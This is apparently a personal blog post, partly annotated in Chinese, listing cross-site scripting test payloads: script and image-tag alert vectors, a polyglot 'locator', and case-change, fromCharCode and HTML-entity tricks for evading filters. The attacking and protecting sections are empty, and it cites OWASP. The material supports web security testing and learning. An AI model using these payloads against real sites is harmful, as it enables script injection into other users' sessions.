---
title: xss cheat sheet
date: 2019-07-09 23:25:59
tags: 
category: websec
---
xss cheat sheet
<!-- more -->
# Testing
## Basic testing
```html
<SCRIPT>alert(1)</SCRIPT>
```
## XSS Locator
xss 定位器, 在用户输入的地方输入此定位器，在返回的页面寻找相关的字符进行渗透
```html
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
```
## Image xss
```
// 有单引号双引号
<IMG src='javascript:alert(1)'>

// 无引号
<IMG SRC=javascript:alert(1)>

// 使用大小写绕过
<IMG SRC=JaVaScript:alert(1)>

// 触发事件
<IMG SRC=# onerror=alert(1)>
```
## fromCharCode
```
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
```
## decimal html
```
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;
&#39;&#88;&#83;&#83;&#39;&#41;>
```
## hexdecimal 
```
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
```


# Attacking 


# Protecting


# Reference
https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet 
http://help.dottoro.com/ljfvvdnm.php
https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md